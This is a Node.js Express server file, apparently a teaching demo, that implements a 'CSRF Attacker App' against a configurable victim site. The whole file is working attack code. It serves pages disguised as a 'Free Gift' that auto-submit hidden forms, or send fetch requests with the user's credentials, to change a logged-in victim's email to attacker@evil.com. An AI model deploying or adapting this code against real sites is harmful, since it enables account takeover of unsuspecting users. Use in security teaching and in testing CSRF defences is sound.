const express = require('express');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

let victimUrl = 'https://YOUR-VICTIM-URL.onrender.com';

// ---------- Root: attack page ----------

app.get('/', (req, res) => {
  res.send(`
    <h1>CSRF Attacker App</h1>

    <p>Current Victim Server:</p>
    <p><code>${escapeHtml(victimUrl)}</code></p>

    <p><a href="/config">Change Victim Server URL</a></p>

    <hr>

    <h2>1. Form POST Attack</h2>
    <p>Visible navigation to Victim App.</p>
    <form method="POST" action="/attack-form-post">
      <button type="submit">Start Form POST attack</button>
    </form>

    <hr>

    <h2>2. Form GET Attack</h2>
    <p>Visible navigation to Victim App. Demonstrates why GET must not change state.</p>
    <form method="POST" action="/attack-form-get">
      <button type="submit">Start Form GET attack</button>
    </form>

    <hr>

    <h2>3. Fetch POST Attack</h2>
    <p>No visible navigation. Response is not readable because of CORS, but the request is sent.</p>
    <form method="POST" action="/attack-fetch-post">
      <button type="submit">Start Fetch POST attack</button>
    </form>

    <hr>

    <h2>4. Fetch GET Attack</h2>
    <p>No visible navigation. Also demonstrates that GET routes changing state are dangerous.</p>
    <form method="POST" action="/attack-fetch-get">
      <button type="submit">Start Fetch GET attack</button>
    </form>
  `);
});

// ---------- Config page ----------

app.get('/config', (req, res) => {
  res.send(`
    <h1>Configure Victim Server</h1>

    <p>Current Victim URL:</p>
    <p><code>${escapeHtml(victimUrl)}</code></p>

    <form method="POST" action="/config">
      <label>
        Victim URL:
        <input
          name="victimUrl"
          value="${escapeHtml(victimUrl)}"
          placeholder="https://YOUR-VICTIM-URL.onrender.com"
          style="width: 420px"
          required
        />
      </label>

      <button type="submit">Save</button>
    </form>

    <p><a href="/">Back to attack page</a></p>
  `);
});

app.post('/config', (req, res) => {
  victimUrl = normalizeUrl(req.body.victimUrl);
  res.redirect('/');
});

// ---------- Form attacks ----------

app.post('/attack-form-post', (req, res) => {
  res.send(`
    <h1>🎁 Free Gift</h1>
    <p>This page silently submits a POST form to the victim app.</p>

    <p>Target:</p>
    <code>${escapeHtml(victimUrl)}/change-email</code>

    <form id="attack" method="POST" action="${escapeHtml(victimUrl)}/change-email">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>

    <script>
      document.getElementById('attack').submit();
    </script>
  `);
});

app.post('/attack-form-get', (req, res) => {
  res.send(`
    <h1>🎁 Free Gift</h1>
    <p>This page silently submits a GET form to the victim app.</p>

    <p>Target:</p>
    <code>${escapeHtml(victimUrl)}/change-email-get</code>

    <form id="attack" method="GET" action="${escapeHtml(victimUrl)}/change-email-get">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>

    <script>
      document.getElementById('attack').submit();
    </script>
  `);
});

// ---------- Fetch attacks ----------

app.post('/attack-fetch-post', (req, res) => {
  res.send(`
    <h1>🎁 Free Gift</h1>
    <p>Fetch POST attack started.</p>
    <p>The victim page is not opened. Check the Victim App email afterwards.</p>

    <p>Target:</p>
    <code>${escapeHtml(victimUrl)}/change-email</code>

    <script>
      fetch("${escapeJs(victimUrl)}/change-email", {
        method: "POST",
        mode: "no-cors",
        credentials: "include",
        body: new URLSearchParams({
          email: "attacker@evil.com"
        })
      });

      document.body.insertAdjacentHTML(
        "beforeend",
        "<p><b>Request sent.</b> Response is opaque / not readable by attacker page.</p>"
      );
    </script>

    <p><a href="/">Back</a></p>
  `);
});

app.post('/attack-fetch-get', (req, res) => {
  res.send(`
    <h1>🎁 Free Gift</h1>
    <p>Fetch GET attack started.</p>
    <p>The victim page is not opened. Check the Victim App email afterwards.</p>

    <p>Target:</p>
    <code>${escapeHtml(victimUrl)}/change-email-get?email=attacker@evil.com</code>

    <script>
      fetch("${escapeJs(victimUrl)}/change-email-get?email=attacker@evil.com", {
        method: "GET",
        mode: "no-cors",
        credentials: "include"
      });

      document.body.insertAdjacentHTML(
        "beforeend",
        "<p><b>Request sent.</b> Response is opaque / not readable by attacker page.</p>"
      );
    </script>

    <p><a href="/">Back</a></p>
  `);
});

// ---------- Helpers ----------

function normalizeUrl(url) {
  return String(url).trim().replace(/\/$/, '');
}

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#039;');
}

function escapeJs(value) {
  return String(value)
    .replaceAll('\\', '\\\\')
    .replaceAll('"', '\\"')
    .replaceAll('\n', '\\n')
    .replaceAll('\r', '\\r');
}

app.listen(port, () => {
  console.log(`Attacker app running on port ${port}`);
});